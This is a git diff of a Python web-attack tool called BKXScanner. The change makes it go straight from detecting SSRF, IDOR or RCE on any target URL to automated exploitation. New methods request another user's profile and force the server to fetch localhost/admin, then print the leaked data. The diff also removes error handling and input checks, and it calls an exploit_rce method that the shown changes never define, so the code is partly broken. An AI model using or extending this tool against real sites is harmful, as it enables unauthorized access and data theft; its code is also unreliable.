@@ -65,6 +65,7 @@ class BKXScanner:
         if result:
             print(f"{Fore.RED}Possible SSRF vulnerability detected!{Style.RESET_ALL}")
             print(f"🔍 {Fore.YELLOW}Leaked Data:{Style.RESET_ALL}\n{result[:500]}")
+            await self.exploit_ssrf()
         else:
             print(f"{Fore.YELLOW}No SSRF vulnerability found.{Style.RESET_ALL}")
 
@@ -77,6 +78,7 @@ class BKXScanner:
         if result and "username" in result:
             print(f"{Fore.RED}IDOR detected! User data is exposed.{Style.RESET_ALL}")
             print(f"🔍 {Fore.YELLOW}Leaked Data:{Style.RESET_ALL}\n{result[:500]}")
+            await self.exploit_idor()
         else:
             print(f"{Fore.YELLOW}No IDOR vulnerability found.{Style.RESET_ALL}")
 
@@ -89,6 +91,7 @@ class BKXScanner:
         if result and "root" in result:
             print(f"{Fore.RED}Possible RCE detected! Server execution is possible.{Style.RESET_ALL}")
             print(f"🔍 {Fore.YELLOW}Leaked Data:{Style.RESET_ALL}\n{result.strip()}")
+            await self.exploit_rce()
         else:
             print(f"{Fore.YELLOW}No RCE vulnerability found.{Style.RESET_ALL}")
 
@@ -118,49 +121,57 @@ class BKXScanner:
             else:
                 print(f"{Fore.YELLOW}No sensitive file found: {file}{Style.RESET_ALL}")
 
+    async def exploit_idor(self):
+        """ اجرای نفوذ آزمایشی IDOR """
+        print(f"{Fore.MAGENTA}[*] Attempting IDOR Exploit...{Style.RESET_ALL}")
+        test_url = f"{self.target_url}/profile?user_id=2"
+        result = await self.request(test_url)
+        if result:
+            print(f"{Fore.RED}[!!] IDOR Exploit Success! Leaked Data:\n{result[:500]}{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.YELLOW}[X] IDOR exploit failed.{Style.RESET_ALL}")
+
+    async def exploit_ssrf(self):
+        """ اجرای نفوذ آزمایشی SSRF """
+        print(f"{Fore.MAGENTA}[*] Attempting SSRF Exploit...{Style.RESET_ALL}")
+        test_url = f"{self.target_url}/internal-api?url=http://localhost/admin"
+        result = await self.request(test_url)
+        if result:
+            print(f"{Fore.RED}[!!] SSRF Exploit Success! Leaked Data:\n{result[:500]}{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.YELLOW}[X] SSRF exploit failed.{Style.RESET_ALL}")
+
 async def main():
-    try:
+    os.system("cls" if os.name == "nt" else "clear")
+    print(LOGO)
+
+    target_url = input(f"{Fore.YELLOW}Enter target URL: {Style.RESET_ALL}")
+    if not target_url.startswith("http"):
+        print(f"{Fore.RED}Invalid URL! Please include http:// or https://{Style.RESET_ALL}")
+        return
+
+    scanner = BKXScanner(target_url)
+    await scanner.start_session()
+
+    while True:
         os.system("cls" if os.name == "nt" else "clear")
         print(LOGO)
 
-        target_url = input(f"{Fore.YELLOW}Enter target URL: {Style.RESET_ALL}")
-        if not target_url.startswith("http"):
-            print(f"{Fore.RED}Invalid URL! Please include http:// or https://{Style.RESET_ALL}")
-            return
+        for key, feature in FEATURES.items():
+            print(f"{Fore.CYAN}[{key}] {feature.replace('_', ' ').title()}{Style.RESET_ALL}")
 
-        shodan_key = os.getenv("SHODAN_API_KEY")
-        scanner = BKXScanner(target_url, shodan_api_key=shodan_key)
-        await scanner.start_session()
+        choice = input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}")
 
-        while True:
-            os.system("cls" if os.name == "nt" else "clear")
-            print(LOGO)
+        if choice == "11":
+            break
 
-            for key, feature in FEATURES.items():
-                print(f"{Fore.CYAN}[{key}] {feature.replace('_', ' ').title()}{Style.RESET_ALL}")
+        task_name = f"scan_{FEATURES[choice]}"
+        task = getattr(scanner, task_name, None)
 
-            choice = input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}")
+        if task:
+            await task()
 
-            if choice == "11":
-                print(f"{Fore.GREEN}Exiting...{Style.RESET_ALL}")
-                break
-
-            if choice in FEATURES:
-                task_name = f"scan_{FEATURES[choice]}"
-                task = getattr(scanner, task_name, None)
-
-                if task:
-                    await task()
-                    input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
-
-        await scanner.close_session()
-
-    except KeyboardInterrupt:
-        print(f"\n{Fore.RED}Interrupted by user!{Style.RESET_ALL}")
-        await scanner.close_session()
-
-    except Exception as e:
-        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
+    await scanner.close_session()
 
 if __name__ == "__main__":
     asyncio.run(main())
